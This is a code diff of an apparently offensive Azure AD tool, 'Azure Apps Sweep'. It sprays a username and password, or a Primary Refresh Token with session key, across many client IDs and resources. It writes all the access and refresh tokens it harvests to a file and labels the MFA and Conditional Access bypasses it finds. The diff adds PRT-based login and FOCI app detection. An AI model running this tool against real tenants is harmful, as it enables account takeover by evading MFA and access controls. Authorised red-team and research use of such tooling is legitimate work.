@@ -3,14 +3,71 @@ import json
 import threading
 import concurrent.futures
 from pprint import pprint
-from colorama import Fore, Style, init
 import requests
 import msal
-from tqdm import tqdm
+import base64
+import sys
+import io
+import re
+import os
+import socket
+from roadtools.roadlib.auth import Authentication
+from rich.console import Console
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn, MofNCompleteColumn
+from rich.panel import Panel
+from rich.table import Table
+from rich import box
 
 
-# Initialize colorama for colored output
-init()
+
+# Initialize Rich console for beautiful output
+console = Console()
+
+# Save original stderr for capturing roadtx output
+ORIGINAL_STDERR = sys.stderr
+
+
+# Azure AD Error Code Mappings
+ERROR_CODE_MAP = {
+    # Consent errors
+    65001: "Not consented",
+    65002: "Not consented by resource",
+
+    # MFA and Conditional Access
+    50076: "MFA required",
+    50079: "MFA required",
+    53003: "Conditional Access Policy",
+
+    # App configuration errors
+    7000112: "Disabled",
+    700016: "Not installed",
+    70001: "Not installed",
+    7000218: "Need client_secret",
+    700019: "Cannot be used or is not authorized",
+
+    # Authentication errors
+    50034: "Unknown user, not going to continue",
+    50126: "Invalid credentials, not going to continue",
+
+    # PRT-specific errors
+    50011: "Invalid redirect URI",
+}
+
+# Fatal error codes that should terminate execution
+FATAL_ERROR_CODES = {50034, 50126}
+
+# Error patterns for text-based detection
+ERROR_TEXT_PATTERNS = [
+    (["redirect uri", "redirect_uri"], "Invalid redirect URI"),
+    (["not found in the directory", "not been installed"], "Not installed"),
+    (["mfa", "multi-factor"], "MFA required"),
+    (["conditional access"], "Conditional Access Policy"),
+    (["consent"], "Not consented"),
+    (["invalid", "prt", "cookie"], "Invalid PRT or PRT expired"),
+    (["disabled"], "Disabled"),
+    (["client_secret", "client secret"], "Need client_secret"),
+    (["bad request"], "Bad request"),
+]
 
 # Rource URIs to authenticate against
 RESOURCE_URIS = [
@@ -5828,9 +5885,9 @@ FOCI_APPS = [
     "eb20f3e3-3dce-4d2c-b721-ebb8d4414067"
 ]
 
-
-INVALID_APPS = {}
-VALID_APPS = {}
+NEEDS_SECRET_APPS = {}  # Apps that failed because they need client_secret (orange)
+VALID_APPS = {}  # Apps that successfully got tokens (green)
+FAILED_APPS = {}  # Apps that failed for other reasons (red)
 FOCI_APPS = []
 
 def authenticate_username_password_native(username, password, client_id, resource_uri):
@@ -5862,38 +5919,20 @@ def authenticate_username_password_native(username, password, client_id, resourc
     if res.status_code != 200:
         error_msg = res.json().get("error_description")
         error_code = res.json().get("error_codes")[0]
-        
-        # Map error codes to summaries
-        error_summary = ""
-        if error_code == 65001:
-            error_summary = "Not consented"
-        elif error_code == 65002:
-            error_summary = "Not consented by resource"
-        elif error_code == 7000112:
-            error_summary = "Disabled"
-        elif error_code == 700016:
-            error_summary = "Not installed"
-        elif error_code == 50076 or error_code == 50079:
-            error_summary = "MFA required"
-        elif error_code == 53003:
-            error_summary = "Conditional Access Policy"
-        elif error_code == 7000218:
-            error_summary = "Need client_secret"
-        elif error_code == 700019:
-            error_summary = "Cannot be used or is not authorized"
-        elif error_code == 50034:
-            error_summary = "Unknown user, not going to continue"
-            print(f"{Fore.RED}{error_summary}{Style.RESET_ALL}")
+
+        # Map error code to summary
+        error_summary = ERROR_CODE_MAP.get(error_code, "Unknown error")
+
+        # Handle fatal errors
+        if error_code in FATAL_ERROR_CODES:
+            console.print(f"[bold red]ERROR: {error_summary}[/bold red]")
             exit(1)
-        elif error_code == 50126:
-            error_summary = "Invalid credentials, not going to continue"
-            print(f"{Fore.RED}{error_summary}{Style.RESET_ALL}")
-            exit(1)
-        else:
-            error_summary = "Unknown error"
-            print(error_code)
-            print(error_msg)
-    
+
+        # Handle unknown errors
+        if error_code not in ERROR_CODE_MAP:
+            console.print(f"[red]Error code: {error_code}[/red]")
+            console.print(f"[red]{error_msg}[/red]")
+
         return {"error_description": error_msg, "error_summary": error_summary, "login_error": True}
     
     token_info = res.json()
@@ -5901,58 +5940,299 @@ def authenticate_username_password_native(username, password, client_id, resourc
     return token_info
 
 
-def process_app_client(name, client_id, username, password, outfile_path, file_lock, valid_lock, print_errors, print_validate):
+def authenticate_prt_native(prt, client_id, resource_uri, session_key=None, verbose=False):
+    """
+    Authenticate using PRT with the native app (public client).
+    Tries to obtain an access token for the given resource URI using PRT.
+
+    Parameters:
+    - prt: The Primary Refresh Token (string, can be base64, JSON, or raw)
+    - client_id: The client ID of the application
+    - resource_uri: The resource URI to access
+    - session_key: Optional session key for derived PRT authentication
+    - verbose: If True, show detailed roadtx output (default: False)
+
+    Returns:
+    - A dictionary containing token information if successful
+    - A dictionary with error information if authentication fails
+    """
+
+    # Capture stdout and stderr to suppress verbose roadtx output
+    old_stdout = sys.stdout
+    old_stderr = sys.stderr
+    captured_output = io.StringIO()
+    captured_errors = io.StringIO()
+
+    try:
+        # Parse PRT from various input formats
+        prt_value = prt
+        session_key_value = session_key
+
+        # Try to detect and parse JSON format
+        try:
+            prt_json = json.loads(prt)
+            if isinstance(prt_json, dict):
+                # Extract PRT and session key from JSON
+                prt_value = prt_json.get("prt", prt_json.get("refresh_token", prt))
+                if not session_key_value and "session_key" in prt_json:
+                    session_key_value = prt_json["session_key"]
+        except (json.JSONDecodeError, ValueError):
+            # Not JSON, continue with other format detection
+            pass
+
+        # Try to detect base64 encoding
+        try:
+            # Check if it looks like base64 (only has base64 valid chars)
+            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in prt_value.strip()):
+                decoded = base64.b64decode(prt_value)
+                # Try to decode as UTF-8
+                decoded_str = decoded.decode('utf-8')
+                # Check if decoded value looks like JSON
+                try:
+                    decoded_json = json.loads(decoded_str)
+                    if isinstance(decoded_json, dict) and "prt" in decoded_json:
+                        prt_value = decoded_json["prt"]
+                        if not session_key_value and "session_key" in decoded_json:
+                            session_key_value = decoded_json["session_key"]
+                except json.JSONDecodeError:
+                    # Decoded but not JSON, use decoded string as PRT
+                    prt_value = decoded_str
+        except Exception:
+            # Not base64 or decoding failed, use original value
+            pass
+
+        # Suppress roadtx verbose output unless verbose mode is enabled
+        if not verbose:
+            sys.stdout = captured_output
+            sys.stderr = captured_errors
+
+        # Set a default timeout for all HTTP requests to prevent hanging
+        # This monkey-patches the requests library used by roadtx
+        original_socket_timeout = socket.getdefaulttimeout()
+        socket.setdefaulttimeout(45)
+
+        try:
+            # Use roadtx to authenticate with PRT
+            auth = Authentication()
+
+            # Set client ID and resource
+            auth.set_client_id(client_id)
+            auth.set_resource_uri(resource_uri)
+
+            # Authenticate using PRT
+            # If we have a session key, use v2 which is newer and more common
+            success = False
+            if session_key_value:
+                # Ensure session key is in bytes format (hex decode if needed)
+                if isinstance(session_key_value, str):
+                    try:
+                        # Try to decode as hex
+                        session_key_bytes = bytes.fromhex(session_key_value.replace(' ', '').replace('-', ''))
+                    except ValueError:
+                        # If not hex, try base64
+                        try:
+                            session_key_bytes = base64.b64decode(session_key_value)
+                        except:
+                            # Use as-is, encoded as bytes
+                            session_key_bytes = session_key_value.encode('utf-8')
+                else:
+                    session_key_bytes = session_key_value
+
+                success = auth.authenticate_with_prt_v2(prt_value, session_key_bytes)
+            else:
+                # Without session key, try using the PRT directly as a refresh token
+                # This is a simpler approach that may work for some scenarios
+                auth.tokendata = {'refreshToken': prt_value}
+                success = auth.authenticate_with_refresh_native(prt_value)
+        finally:
+            # Restore original socket timeout
+            socket.setdefaulttimeout(original_socket_timeout)
+
+        # Restore stdout and stderr
+        if not verbose:
+            sys.stdout = old_stdout
+            sys.stderr = old_stderr
+
+        if success and auth.tokendata:
+            # Extract tokens from auth.tokendata
+            token_info = {}
+
+            # Map roadtx token data to expected format
+            if 'accessToken' in auth.tokendata:
+                token_info['access_token'] = auth.tokendata['accessToken']
+            if 'refreshToken' in auth.tokendata:
+                token_info['refresh_token'] = auth.tokendata['refreshToken']
+            if 'idToken' in auth.tokendata:
+                token_info['id_token'] = auth.tokendata['idToken']
+            if 'tokenType' in auth.tokendata:
+                token_info['token_type'] = auth.tokendata['tokenType']
+            if 'expiresIn' in auth.tokendata:
+                token_info['expires_in'] = auth.tokendata['expiresIn']
+            if 'expiresOn' in auth.tokendata:
+                token_info['expires_on'] = auth.tokendata['expiresOn']
+
+            # Add FOCI status
+            token_info["is_foci"] = client_id in FOCI_APPS
+
+            return token_info
+        else:
+            # Authentication failed - parse error from captured output
+            error_output = captured_errors.getvalue() + captured_output.getvalue()
+            error_summary = parse_prt_error(error_output)
+
+            return {
+                "error_description": error_output if verbose else f"PRT authentication failed: {error_summary}",
+                "error_summary": error_summary,
+                "login_error": True
+            }
+
+    except Exception as e:
+        # Restore stdout and stderr in case of exception
+        if not verbose:
+            sys.stdout = old_stdout
+            sys.stderr = old_stderr
+
+        # Handle any errors during PRT authentication
+        error_message = str(e)
+        error_output = captured_errors.getvalue() + captured_output.getvalue()
+
+        # Try to extract error information from exception and captured output
+        error_summary = parse_prt_error(error_message + "\n" + error_output)
+
+        return {
+            "error_description": error_output if verbose else error_message,
+            "error_summary": error_summary,
+            "login_error": True
+        }
+
+
+def parse_prt_error(error_text):
+    """
+    Parse error messages from roadtx/Azure AD and return a concise error summary.
+
+    Parameters:
+    - error_text: The error text to parse
+
+    Returns:
+    - A concise error summary string
+    """
+    # Extract AADSTS error code
+    aadsts_match = re.search(r'AADSTS(\d+)', error_text)
+    if aadsts_match:
+        error_code = int(aadsts_match.group(1))
+        # Use the shared error code mapping
+        if error_code in ERROR_CODE_MAP:
+            return ERROR_CODE_MAP[error_code]
+
+    # Check for specific error patterns in text
+    error_lower = error_text.lower()
+
+    for patterns, message in ERROR_TEXT_PATTERNS:
+        # For PRT-specific pattern with multiple keywords
+        if len(patterns) > 2 and all(p in error_lower for p in patterns):
+            return message
+        # For single or dual keyword patterns
+        elif any(p in error_lower for p in patterns):
+            return message
+
+    # Default fallback
+    return "PRT authentication failed"
+
+
+def process_app_client(name, client_id, username, password, prt, session_key, outfile_path, file_lock, valid_lock, print_errors, verbose=False, progress_console=None):
     """
     Process a single app and client ID combination.
     Iterates through all resource URIs and attempts authentication.
     Writes the token to the temporary file if successfully created.
     """
 
-    global INVALID_APPS, VALID_APPS, FOCI_APPS
+    global NEEDS_SECRET_APPS, VALID_APPS, FAILED_APPS, FOCI_APPS
     last_error = None
+    got_token = False
+
+    # Use provided console or fall back to global
+    output_console = progress_console if progress_console else console
 
     for res_uri in RESOURCE_URIS:
-        token = authenticate_username_password_native(username, password, client_id, res_uri)
-        
+        # Choose authentication method based on provided credentials
+        if prt:
+            token = authenticate_prt_native(prt, client_id, res_uri, session_key, verbose)
+        else:
+            token = authenticate_username_password_native(username, password, client_id, res_uri)
+
         if token.get("login_error"):
             last_error = token.get("error_summary", "Unknown error")
-            # If this is the last resource URI, print the error details.
-            if res_uri == RESOURCE_URIS[-1]:
-                if last_error != "Not consented by resource" or print_errors:
-                    print(f"{Fore.RED}Failed to create token for app {name} ({client_id}) with {res_uri}. Reason: {last_error}{Style.RESET_ALL}")
-                if print_errors:
-                    print(f"{Fore.YELLOW}Error details: {token.get('error_description', 'No details provided')}{Style.RESET_ALL}")
-            
-            if last_error == "Need client_secret" and print_validate:
-                with valid_lock:
-                    if name in INVALID_APPS:
-                        if client_id not in INVALID_APPS[name]:
-                            INVALID_APPS[name].append(client_id)
-                    else:
-                        INVALID_APPS[name] = [client_id]
-            continue
-        
-        # Successful token creation
-        msg = f"{Fore.GREEN}Token created for app {name} ({client_id}) with {res_uri}{Style.RESET_ALL}"
 
-        if token.get("is_foci"):
-            print(f"{Fore.YELLOW}FOCI {Fore.GREEN}{msg}")
-        else:
-            print(msg)
-        
-        # Write token information to the temporary file in a thread-safe manner
-        with file_lock:
-            with open(outfile_path, "a") as f:
-                f.write(f"App: {name}, Client: {client_id}, Resource: {res_uri}, Token: {token}\n\n\n")
-    
-    # Update the global VALID_APPS or INVALID_APPS dictionaries safely
-    if print_validate:
-        with valid_lock:
-            if name in VALID_APPS:
-                if client_id not in VALID_APPS[name]:
-                    VALID_APPS[name].append(client_id)
-            else:
-                VALID_APPS[name] = [client_id]
+            # Print error on last resource URI attempt
+            is_last_resource = (res_uri == RESOURCE_URIS[-1])
+            should_print_error = (last_error != "Not consented by resource" or print_errors)
+
+            if is_last_resource and should_print_error:
+                output_console.print(f"[red]FAIL[/red] [cyan]{name}[/cyan] ({client_id}) with {res_uri}. Reason: [yellow]{last_error}[/yellow]")
+                if print_errors:
+                    output_console.print(f"  [dim]Details: {token.get('error_description', 'No details provided')}[/dim]")
+
+            continue
+
+        # Successful token creation
+        got_token = True
+        _print_success_message(name, client_id, res_uri, token.get("is_foci"), output_console)
+        _write_token_to_file(name, client_id, res_uri, token, outfile_path, file_lock)
+
+    # Track app status based on outcome - always enabled now
+    if got_token:
+        _add_to_valid_apps(name, client_id, valid_lock)
+    elif last_error == "Need client_secret":
+        _add_to_needs_secret_apps(name, client_id, valid_lock)
+    elif last_error:
+        _add_to_failed_apps(name, client_id, last_error, valid_lock)
+
+
+
+def _add_to_needs_secret_apps(name, client_id, valid_lock):
+    """Helper to add app to NEEDS_SECRET_APPS dictionary in thread-safe manner."""
+    global NEEDS_SECRET_APPS
+    with valid_lock:
+        if name not in NEEDS_SECRET_APPS:
+            NEEDS_SECRET_APPS[name] = []
+        if client_id not in NEEDS_SECRET_APPS[name]:
+            NEEDS_SECRET_APPS[name].append(client_id)
+
+
+def _add_to_valid_apps(name, client_id, valid_lock):
+    """Helper to add app to VALID_APPS dictionary in thread-safe manner."""
+    global VALID_APPS
+    with valid_lock:
+        if name not in VALID_APPS:
+            VALID_APPS[name] = []
+        if client_id not in VALID_APPS[name]:
+            VALID_APPS[name].append(client_id)
+
+
+def _add_to_failed_apps(name, client_id, error_reason, valid_lock):
+    """Helper to add app to FAILED_APPS dictionary in thread-safe manner."""
+    global FAILED_APPS
+    with valid_lock:
+        if name not in FAILED_APPS:
+            FAILED_APPS[name] = []
+        # Store as tuple (client_id, error_reason) but only track unique client_ids
+        if not any(cid == client_id for cid, _ in FAILED_APPS[name]):
+            FAILED_APPS[name].append((client_id, error_reason))
+
+
+
+def _print_success_message(name, client_id, res_uri, is_foci, console):
+    """Helper to print success message with optional FOCI indicator."""
+    prefix = "[yellow]FOCI[/yellow] [green]OK[/green]" if is_foci else "[green]OK[/green]"
+    console.print(f"{prefix} [cyan]{name}[/cyan] ({client_id}) with {res_uri}")
+
+
+def _write_token_to_file(name, client_id, res_uri, token, outfile_path, file_lock):
+    """Helper to write token information to file in thread-safe manner."""
+    with file_lock:
+        with open(outfile_path, "a") as f:
+            f.write(f"App: {name}, Client: {client_id}, Resource: {res_uri}, Token: {token}\n\n\n")
+
 
 def process_if_foci_app(client_id, foci_refresh_token, tenant, valid_lock):
     """
@@ -5965,7 +6245,7 @@ def process_if_foci_app(client_id, foci_refresh_token, tenant, valid_lock):
         scopes = [f"{res_uri}.default"] # res_uri already ends with "/"
         if check_if_foci_app(client_id, foci_refresh_token, scopes, tenant):
             with valid_lock:
-                print(f"{Fore.YELLOW}FOCI app found: {client_id} with resource {res_uri}{Style.RESET_ALL}")
+                console.print(f"[yellow]FOCI app found:[/yellow] [cyan]{client_id}[/cyan] with resource {res_uri}")
                 FOCI_APPS.append(client_id)
                 break
 
@@ -5986,98 +6266,327 @@ def check_if_foci_app(client_id, foci_refresh_token, scopes, tenant_id):
         return False
 
 
+def _read_prt_input(prt_file, prt_string):
+    """
+    Helper function to read PRT from file or string.
+    Automatically detects if prt_string is a file path.
+
+    Parameters:
+    - prt_file: Path to file containing PRT
+    - prt_string: PRT as string or file path
+
+    Returns:
+    - PRT string content
+    """
+    import os
+
+    # Check if prt_file is provided
+    if prt_file:
+        try:
+            with open(prt_file, 'r') as f:
+                return f.read().strip()
+        except Exception as e:
+            console.print(f"[bold red]Error reading PRT file:[/bold red] {e}")
+            exit(1)
+
+    # Check if prt_string is actually a file path
+    if prt_string and os.path.isfile(prt_string):
+        try:
+            with open(prt_string, 'r') as f:
+                return f.read().strip()
+        except Exception as e:
+            console.print(f"[bold red]Error reading PRT file:[/bold red] {e}")
+            exit(1)
+
+    return prt_string
+
+
 def main():
     """
     Main function to authenticate with apps and resource URIs using threading.
     Sets up the argument parser, starts the threads, and prints the results.
     """
-    global INVALID_APPS, VALID_APPS, FOCI_APPS
+    global NEEDS_SECRET_APPS, VALID_APPS, FAILED_APPS, FOCI_APPS
 
     parser = argparse.ArgumentParser(description='Authenticate to apps and resources.')
-    parser.add_argument('--username', required=True, type=str, help='Username to login')
-    parser.add_argument('--password', required=True, type=str, help='Password to login')
+    parser.add_argument('--username', required=False, type=str, help='Username to login')
+    parser.add_argument('--password', required=False, type=str, help='Password to login')
+    parser.add_argument('--prt', required=False, type=str, help='Primary Refresh Token (supports base64, JSON, or raw format)')
+    parser.add_argument('--prt-file', required=False, type=str, help='File containing Primary Refresh Token')
+    parser.add_argument('--session-key', required=False, type=str, help='Session key for PRT-based authentication')
+    parser.add_argument('--tenant', required=False, type=str, help='Tenant domain or ID (required for PRT auth)')
     parser.add_argument('--outfile', required=True, type=str, help='File path to write tokens')
     parser.add_argument('--print-errors', action='store_true', help='Print the whole error description.')
-    parser.add_argument('--threads', type=int, default=5, help='Number of threads (default 5)')
-    parser.add_argument('--print-validate', default=False, action='store_true', help='Print jsons of valid and invalid (secret required) apps')
+    parser.add_argument('--verbose', action='store_true', help='Enable verbose output from roadtx (for PRT authentication debugging)')
+    parser.add_argument('--threads', type=int, default=None, help='Number of threads (default: 3 for PRT, 5 for password)')
     parser.add_argument('--get-foci-apps', default=False, action='store_true', help="If true, AppSweep won't be performed but just apps will be checkd if they are FOCI. The given credentials must be able to generate a refresh token on the Azure CLI app.")
     args = parser.parse_args()
 
-    username = args.username
-    password = args.password
+    # Validate arguments and determine authentication method
+    auth_config = {
+        'prt': None,
+        'session_key': None,
+        'tenant': None,
+        'username': None,
+        'password': None
+    }
+
+    # Determine authentication mode
+    is_prt_mode = bool(args.prt or args.prt_file)
+    is_password_mode = bool(args.username and args.password)
+
+    if is_prt_mode:
+        # PRT authentication mode
+        if not args.tenant:
+            parser.error("--tenant is required when using PRT authentication")
+        if is_password_mode:
+            parser.error("Cannot use both PRT and password authentication simultaneously")
+
+        # Read PRT from file or argument
+        auth_config['prt'] = _read_prt_input(args.prt_file, args.prt)
+        auth_config['session_key'] = args.session_key
+        auth_config['tenant'] = args.tenant
+
+    elif is_password_mode:
+        # Password authentication mode
+        auth_config['username'] = args.username
+        auth_config['password'] = args.password
+        auth_config['tenant'] = args.tenant or args.username.split("@")[1]
+
+    else:
+        parser.error("Either --prt/--prt-file with --tenant OR --username with --password is required")
+
+    # Extract for convenience
+    prt = auth_config['prt']
+    session_key = auth_config['session_key']
+    tenant = auth_config['tenant']
+    username = auth_config['username']
+    password = auth_config['password']
+
+    # Set default thread count based on authentication mode if not specified
+    if args.threads is None:
+        n_threads = 3 if is_prt_mode else 5
+    else:
+        n_threads = args.threads
+
     outfile_path = args.outfile
     print_errors = args.print_errors
-    n_threads = args.threads
-    print_validate = args.print_validate
+    verbose = args.verbose
     get_foci_apps = args.get_foci_apps
-    tenant = username.split("@")[1]
 
     foci_refresh_token = ""
     if get_foci_apps:
-        print(f"{Fore.MAGENTA}You used the '--get-foci-apps' arg, note that this won't search for bypasses but just check the configured apps to find wich ones are FOCI apps. This is a research behaviour and potentially not what you want to do. To find bypasses just pass '--username <email> --password <password>'.{Style.RESET_ALL}")
-        tokens = authenticate_username_password_native(username, password, "04b07795-8ddb-461a-bbee-02f9e1bf7b46", "https://management.azure.com/")
+        console.print(Panel(
+            "[yellow]Note:[/yellow] FOCI detection mode checks which apps support Family of Client IDs.\n"
+            "This is research behavior. To find MFA bypasses, use normal mode without --get-foci-apps.",
+            border_style="yellow",
+            title="[bold yellow]FOCI Mode[/bold yellow]"
+        ))
+
+        # Get initial token for FOCI detection
+        if prt:
+            tokens = authenticate_prt_native(prt, "04b07795-8ddb-461a-bbee-02f9e1bf7b46", "https://management.azure.com/", session_key, verbose)
+        else:
+            tokens = authenticate_username_password_native(username, password, "04b07795-8ddb-461a-bbee-02f9e1bf7b46", "https://management.azure.com/")
+
+        if tokens.get("login_error"):
+            console.print(f"[bold red]ERROR: Failed to get initial token for FOCI detection:[/bold red] {tokens.get('error_summary', 'Unknown error')}")
+            exit(1)
+
         foci_refresh_token = tokens["refresh_token"]
 
     # Initialize locks for thread-safe file writing and dictionary updates
     file_lock = threading.Lock()
     valid_lock = threading.Lock()
 
-    # Use a ThreadPoolExecutor with 3 threads
+    # Use a ThreadPoolExecutor with proper progress tracking
     if not get_foci_apps:
-        print(f"{Fore.MAGENTA} Starting checking apps...{Style.RESET_ALL}")
-        with concurrent.futures.ThreadPoolExecutor(max_workers=n_threads) as executor:
-            futures = []
-            for name, client_ids in APPS.items():
-                for client_id in client_ids:
-                    #print(f"{Fore.CYAN}Logging into app {name} ({client_id}){Style.RESET_ALL}")
-                    future = executor.submit(process_app_client, name, client_id, username, password, outfile_path, file_lock, valid_lock, print_errors, print_validate)
-                    futures.append(future)
-            # Wait for all threads to finish
-            concurrent.futures.wait(futures)
-    
+        # Display header
+        console.print(Panel.fit(
+            "[bold cyan]Azure Apps Sweep[/bold cyan]\n"
+            f"[dim]Authentication: {'PRT' if prt else 'Username/Password'}[/dim]\n"
+            f"[dim]Threads: {n_threads}[/dim]\n"
+            f"[dim]Output file: {outfile_path}[/dim]",
+            border_style="cyan"
+        ))
+
+        # Calculate total number of apps to process
+        total_tasks = sum(len(ids) for ids in APPS.values())
+
+        # Create Rich Progress with custom columns
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            MofNCompleteColumn(),
+            TextColumn("•"),
+            TimeElapsedColumn(),
+            TextColumn("•"),
+            TimeRemainingColumn(),
+            console=console,
+            transient=False,
+            refresh_per_second=4
+        ) as progress:
+
+            task_id = progress.add_task("[cyan]Scanning apps...", total=total_tasks)
+
+            completed = 0
+            with concurrent.futures.ThreadPoolExecutor(max_workers=n_threads) as executor:
+                # Submit all tasks and store futures in a dict mapped to their task info
+                future_to_task = {}
+                for name, client_ids in APPS.items():
+                    for client_id in client_ids:
+                        future = executor.submit(
+                            process_app_client,
+                            name, client_id, username, password, prt, session_key,
+                            outfile_path, file_lock, valid_lock,
+                            print_errors, verbose, progress.console
+                        )
+                        future_to_task[future] = (name, client_id)
+
+                # Process completed futures
+                for future in concurrent.futures.as_completed(future_to_task):
+                    try:
+                        # Get result to raise any exceptions
+                        future.result()
+                    except Exception as e:
+                        name, client_id = future_to_task[future]
+                        console.print(f"[red]Exception processing {name} ({client_id}):[/red] {e}")
+
+                    completed += 1
+                    progress.update(task_id, completed=completed)
+
+        # Summary
+        console.print(f"\n[bold green]>> Scan complete![/bold green] Processed {total_tasks} apps")
+
     else:
-        print(f"{Fore.MAGENTA}Starting checking FOCI apps...{Style.RESET_ALL}")
+        # Display header for FOCI mode
+        console.print(Panel.fit(
+            "[bold cyan]Azure Apps Sweep - FOCI Detection Mode[/bold cyan]\n"
+            f"[yellow]Checking which apps support Family of Client IDs[/yellow]\n"
+            f"[dim]Output file: {outfile_path}[/dim]",
+            border_style="yellow"
+        ))
+
         total_tasks = sum(len(ids) for ids in APPS.values()) + sum(len(ids) for ids in REQUIRE_SECRET_APPS.values())
 
-        with concurrent.futures.ThreadPoolExecutor(max_workers=n_threads) as executor:
-            futures = []
-            
-            # Schedule tasks
-            for name, client_ids in APPS.items():
-                for client_id in client_ids:
-                    futures.append(
-                        executor.submit(process_if_foci_app, client_id, foci_refresh_token, tenant, valid_lock)
-                    )
+        # Create Rich Progress
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            MofNCompleteColumn(),
+            TextColumn("•"),
+            TimeElapsedColumn(),
+            TextColumn("•"),
+            TimeRemainingColumn(),
+            console=console,
+            transient=False,
+            refresh_per_second=4
+        ) as progress:
 
-            for name, client_ids in REQUIRE_SECRET_APPS.items():
-                for client_id in client_ids:
-                    futures.append(
-                        executor.submit(process_if_foci_app, client_id, foci_refresh_token, tenant, valid_lock)
-                    )
+            task_id = progress.add_task("[yellow]Checking FOCI apps...", total=total_tasks)
 
-            # Track completion with tqdm
-            for _ in tqdm(concurrent.futures.as_completed(futures), total=total_tasks, desc="Processing Apps"):
-                pass  # tqdm automatically updates progress as tasks complete
-    
+            completed = 0
+            with concurrent.futures.ThreadPoolExecutor(max_workers=n_threads) as executor:
+                # Submit all tasks
+                future_to_client = {}
+
+                # Schedule tasks
+                for name, client_ids in APPS.items():
+                    for client_id in client_ids:
+                        future = executor.submit(
+                            process_if_foci_app,
+                            client_id, foci_refresh_token, tenant, valid_lock
+                        )
+                        future_to_client[future] = client_id
+
+                for name, client_ids in REQUIRE_SECRET_APPS.items():
+                    for client_id in client_ids:
+                        future = executor.submit(
+                            process_if_foci_app,
+                            client_id, foci_refresh_token, tenant, valid_lock
+                        )
+                        future_to_client[future] = client_id
+
+                # Process completed futures with timeout
+                try:
+                    for future in concurrent.futures.as_completed(future_to_client, timeout=300):
+                        try:
+                            # Get result to raise any exceptions
+                            future.result()
+                        except Exception as e:
+                            client_id = future_to_client[future]
+                            console.print(f"[red]Exception processing {client_id}:[/red] {e}")
+
+                        completed += 1
+                        progress.update(task_id, completed=completed)
+
+                except concurrent.futures.TimeoutError:
+                    console.print("[yellow]Warning: Some tasks timed out[/yellow]")
+
+        console.print(f"\n[bold green]>> FOCI check complete![/bold green] Processed {total_tasks} apps")
+
+    # Display FOCI apps summary
     if FOCI_APPS:
-        print(f"{Fore.MAGENTA}=============================={Style.RESET_ALL}")
-        print(f"{Fore.RED}FOCI apps:{Style.RESET_ALL}")
+        foci_table = Table(title="FOCI Apps Found", box=box.ROUNDED, border_style="yellow")
+        foci_table.add_column("Client ID", style="cyan")
+        foci_table.add_column("Note", style="dim")
+
         for app in FOCI_APPS:
             if app in ALL_APP_REQ_SECRET_IDS:
-                print(f"{Fore.YELLOW}{app}{Style.RESET_ALL} (requires secret)")
+                foci_table.add_row(app, "requires secret")
             else:
-                print(f"{Fore.YELLOW}{app}{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}=============================={Style.RESET_ALL}")
-    
-    if print_validate:
-        print(f"{Fore.MAGENTA}=============================={Style.RESET_ALL}")
-        print(f"{Fore.RED}Invalid apps:{Style.RESET_ALL}")
-        print(json.dumps(INVALID_APPS, indent=4))
-        print("===============================")
-        print(f"{Fore.GREEN}Valid apps:{Style.RESET_ALL}")
-        print(json.dumps(VALID_APPS, indent=4))
+                foci_table.add_row(app, "")
+
+        console.print("\n")
+        console.print(foci_table)
+
+    # Display valid/invalid apps - always enabled
+    # Valid apps table (GREEN) - Successfully got tokens
+    if VALID_APPS:
+        valid_table = Table(title="✓ Valid Apps (Got Tokens)", box=box.ROUNDED, border_style="green")
+        valid_table.add_column("App Name", style="cyan")
+        valid_table.add_column("Client IDs", style="dim")
+
+        for name, client_ids in VALID_APPS.items():
+            valid_table.add_row(name, ", ".join(client_ids[:3]) + ("..." if len(client_ids) > 3 else ""))
+
+        console.print("\n")
+        console.print(valid_table)
+
+    # Needs secret apps table (ORANGE) - Failed because need client_secret
+    if NEEDS_SECRET_APPS:
+        needs_secret_table = Table(title="⚠ Apps Requiring Client Secret", box=box.ROUNDED, border_style="yellow")
+        needs_secret_table.add_column("App Name", style="cyan")
+        needs_secret_table.add_column("Client IDs", style="dim")
+
+        for name, client_ids in NEEDS_SECRET_APPS.items():
+            needs_secret_table.add_row(name, ", ".join(client_ids[:3]) + ("..." if len(client_ids) > 3 else ""))
+
+        console.print("\n")
+        console.print(needs_secret_table)
+
+    # Failed apps table (RED) - Failed for other reasons
+    if FAILED_APPS:
+            failed_table = Table(title="✗ Failed Apps (Other Reasons)", box=box.ROUNDED, border_style="red")
+            failed_table.add_column("App Name", style="cyan")
+            failed_table.add_column("Client ID", style="dim")
+            failed_table.add_column("Reason", style="yellow")
+
+            for name, entries in FAILED_APPS.items():
+                for client_id, error_reason in entries:
+                    failed_table.add_row(name, client_id, error_reason)
+
+            console.print("\n")
+            console.print(failed_table)
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        console.print("\n\n[yellow][!] Interrupted by user[/yellow]")
+        console.print("[dim]Exiting safely...[/dim]")
+        os._exit(1)
 
 
